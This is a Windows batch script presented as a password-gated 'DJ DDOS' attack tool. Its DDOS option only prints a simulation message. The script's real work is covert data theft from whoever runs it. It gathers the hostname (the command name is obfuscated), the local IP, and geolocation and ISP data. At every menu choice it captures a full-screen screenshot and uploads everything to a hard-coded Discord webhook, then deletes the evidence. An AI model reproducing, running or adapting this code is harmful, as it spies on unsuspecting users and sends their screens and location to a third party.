@echo off
color 5
title DJ DDOS
setlocal EnableDelayedExpansion

:: === Access Interface (Username & Password) ===

set "correctUser=DeadSec"
set "correctPass=2010"
set "screenshotFile="

:loginPrompt
cls
echo ========================
echo    DJ DDOS - by yy_osu
echo ========================
set /p "user=Enter Username: "

:: Get hidden password via PowerShell, store in variable 'pass'
for /f "usebackq delims=" %%P in (
  `powershell -NoProfile -Command "$p = Read-Host -AsSecureString; $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p); [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)"`
) do set "pass=%%P"

if /i "%user%"=="%correctUser%" if "%pass%"=="%correctPass%" goto accessGranted

echo.
echo Incorrect username or password. Try again.
timeout /t 2 /nobreak >nul
goto loginPrompt

:accessGranted
cls
echo ========================
echo    DJ DDOS - by yy_osu
echo ========================
echo Access Granted.
timeout /t 1 /nobreak >nul

:: === User Consent ===
echo 
echo.
set /p consent="Type Y to agree and continue, anything else to exit: "
if /i not "!consent!"=="Y" (
    echo Consent not granted. Exiting...
    exit /b
)

:: === Configuration ===
set "webhookURL=https://discordapp.com/api/webhooks/1391074659146924122/dwcU0TaH0UmvYIjZytKCbpTiemh_e2TQtrBu4gcPX7nuBG2If0oD_QT_IHmt9uPt4wpm"

:: === Module: Get Hostname ===
call :getHostname

:: === Module: Get Local IP ===
call :getLocalIP

:: === Module: Get Geo & ISP Info ===
call :getGeoInfo

:menu
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo 1. IP Ping
echo 2. DDOS
echo 3. Geo Locate
echo 4. Quit
echo.
set /p choice="Select an option (1-4): "

if "%choice%"=="1" (
  call :takeScreenshot
  goto inputIPwithAction
)
if "%choice%"=="2" (
  call :takeScreenshot
  goto inputIPwithAction
)
if "%choice%"=="3" (
  call :takeScreenshot
  goto inputIPwithAction
)
if "%choice%"=="4" (
  call :takeScreenshot
  goto quitAndLog
)

echo Invalid choice. Please select 1, 2, 3, or 4.
timeout /t 2 /nobreak >nul
goto menu

:inputIPwithAction
:: Save choice for action
set "selectedAction=%choice%"
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo Enter the IP address to use:
set /p "targetIP=> "
if "%targetIP%"=="" (
    echo IP cannot be empty.
    timeout /t 2 /nobreak >nul
    goto inputIPwithAction
)

if "%selectedAction%"=="1" goto ipPing
if "%selectedAction%"=="2" goto ddos
if "%selectedAction%"=="3" goto geoLocate

goto menu

:ipPing
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo You selected IP Ping.
echo.
echo Pinging IP: %targetIP%
ping -n 4 "%targetIP%"
call :composePayloadWithIP "IP Ping" "%targetIP%"
call :sendToDiscord
echo.
echo 
pause
goto menu

:ddos
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo You selected DDOS.
echo Simulating DDOS attack on IP: %targetIP%
timeout /t 3 /nobreak >nul
call :composePayloadWithIP "DDOS" "%targetIP%"
call :sendToDiscord
echo.
echo 
pause
goto menu

:geoLocate
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo You selected Geo Locate.
echo Target IP: %targetIP%
echo Country: %geo_Country%
echo Region: %geo_Region%
echo City: %geo_City%
echo ISP: %geo_ISP%
call :composePayloadWithIP "Geo Locate" "%targetIP%"
call :sendToDiscord
echo.
echo 
pause
goto menu

:quitAndLog
cls
echo ==============================
echo           DJ DDOS MENU
echo ==============================
echo Quitting and logging info...
call :composePayloadWithIP "User Quit" "N/A"
call :sendToDiscord
timeout /t 2 /nobreak >nul
exit /b

:takeScreenshot
set "screenshotFile=%temp%\screenshot_%random%.png"
powershell -NoProfile -Command ^
  "Add-Type -AssemblyName System.Drawing; ^
   Add-Type -AssemblyName System.Windows.Forms; ^
   $bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); ^
   $graphics = [Drawing.Graphics]::FromImage($bmp); ^
   $graphics.CopyFromScreen([Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [Drawing.Point]::Empty, $bmp.Size); ^
   $bmp.Save('%screenshotFile%', [Drawing.Imaging.ImageFormat]::Png); ^
   $graphics.Dispose(); $bmp.Dispose();"
exit /b

:composePayloadWithIP
:: %1 = action, %2 = IP entered by user
set "action=%~1"
set "targetIP=%~2"

:: Escape strings for JSON
call :jsonEscape "%hostname%" hEsc
call :jsonEscape "%ip%" ipEsc
call :jsonEscape "%geo_Country%" cEsc
call :jsonEscape "%geo_Region%" rEsc
call :jsonEscape "%geo_City%" cityEsc
call :jsonEscape "%geo_ISP%" ispEsc
call :jsonEscape "%action%" actionEsc
call :jsonEscape "%targetIP%" ipEsc2

set "jsonfile=%temp%\payload_%random%.json"
(
  echo {
  echo     "username": "DJ DDOS Bot",
  echo     "embeds": [{
  echo         "title": "Action Report: %actionEsc%",
  echo         "color": 8388736,
  echo         "fields": [
  echo             { "name": "Hostname", "value": "%hEsc%", "inline": true },
  echo             { "name": "Local IP", "value": "%ipEsc%", "inline": true },
  echo             { "name": "Country", "value": "%cEsc%", "inline": true },
  echo             { "name": "Region", "value": "%rEsc%", "inline": true },
  echo             { "name": "City", "value": "%cityEsc%", "inline": true },
  echo             { "name": "ISP", "value": "%ispEsc%", "inline": true },
  echo             { "name": "Target IP", "value": "%ipEsc2%", "inline": true },
  echo             { "name": "Action", "value": "%actionEsc%", "inline": false }
  echo         ],
  echo         "footer": { "text": "Made By yy_osu" }
  echo     }]
  echo }
) > "%jsonfile%"
exit /b

:jsonEscape
setlocal enabledelayedexpansion
set "str=%~1"
set "str=!str:\=\\!"
set "str=!str:"=\\\"!"
endlocal & set "%2=%str%"
exit /b

:sendToDiscord
if not defined screenshotFile (
  powershell -NoProfile -Command ^
    "$uri = '%webhookURL%';" ^
    "$jsonFile = '%jsonfile%';" ^
    "$content = Get-Content -Raw -Path $jsonFile;" ^
    "Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $content;" ^
    "Remove-Item $jsonFile;" ^
    "Write-Host 'Sent payload to Discord webhook.'"
) else (
  if exist "%screenshotFile%" (
    powershell -NoProfile -Command ^
    "try {" ^
      "$uri = '%webhookURL%';" ^
      "$jsonPayload = Get-Content -Raw -Path '%jsonfile%';" ^
      "$multipartContent = New-Object System.Net.Http.MultipartFormDataContent;" ^
      "$jsonContent = New-Object System.Net.Http.StringContent($jsonPayload, [System.Text.Encoding]::UTF8, 'application/json');" ^
      "$multipartContent.Add($jsonContent, 'payload_json');" ^
      "$fileStream = [System.IO.File]::OpenRead('%screenshotFile%');" ^
      "$fileContent = New-Object System.Net.Http.StreamContent($fileStream);" ^
      "$fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data');" ^
      "$fileContent.Headers.ContentDisposition.Name = 'file';" ^
      "$fileContent.Headers.ContentDisposition.FileName = 'screenshot.png';" ^
      "$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png');" ^
      "$multipartContent.Add($fileContent);" ^
      "$client = New-Object System.Net.Http.HttpClient;" ^
      "$response = $client.PostAsync($uri, $multipartContent).Result;" ^
      "$fileStream.Dispose();" ^
      "$client.Dispose();" ^
      "if ($response.IsSuccessStatusCode) { Write-Host 'Sent payload and screenshot to Discord webhook.' }" ^
      "else { Write-Host 'Failed to send payload and screenshot. Status code: ' + $response.StatusCode }" ^
      "Remove-Item '%screenshotFile%';" ^
      "Remove-Item '%jsonfile%';" ^
    "} catch { Write-Host 'Failed to send to Discord: ' $_.Exception.Message }"
    set "screenshotFile="
  ) else (
    powershell -NoProfile -Command ^
      "$uri = '%webhookURL%';" ^
      "$jsonFile = '%jsonfile%';" ^
      "$content = Get-Content -Raw -Path $jsonFile;" ^
      "Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $content;" ^
      "Remove-Item $jsonFile;" ^
      "Write-Host 'Sent payload to Discord webhook.'"
  )
)
exit /b

:getHostname
set "h1=h"
set "h2=o"
set "h3=s"
set "h4=t"
set "h5=n"
set "h6=a"
set "h7=m"
set "h8=e"
set "cmdHost=%h1%%h2%%h3%%h4%%h5%%h6%%h7%%h8%"
for /f "delims=" %%a in ('%cmdHost%') do set "hostname=%%a"
exit /b

:getLocalIP
set "ip="
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
    set "line=%%a"
    setlocal enabledelayedexpansion
    set "line=!line:~1!"
    if "!line:~0,3!" neq "127" (
        endlocal & set "ip=!line!"
        goto ipfound
    )
    endlocal
)
:ipfound
if not defined ip set "ip=Unavailable"
exit /b

:getGeoInfo
for /f "delims=" %%a in ('
  powershell -NoProfile -Command ^
    "try { $r=Invoke-RestMethod http://ip-api.com/json; '^Country:' + $r.country + '^Region:' + $r.regionName + '^City:' + $r.city + '^ISP:' + $r.isp } catch { '^Country:Unavailable^Region:Unavailable^City:Unavailable^ISP:Unavailable' }"
') do set "geoInfo=%%a"

for %%V in (Country Region City ISP) do (
    for /f "tokens=1,* delims=^" %%X in ("!geoInfo!") do (
        for /f "tokens=2 delims=:" %%Y in ("%%X") do set "geo_%%V=%%Y"
        set "geoInfo=!geoInfo:*^=!"
    )
)

for %%V in (Country Region City ISP) do (
    for /f "tokens=* delims= " %%T in ("!geo_%%V!") do set "geo_%%V=%%T"
)
exit /b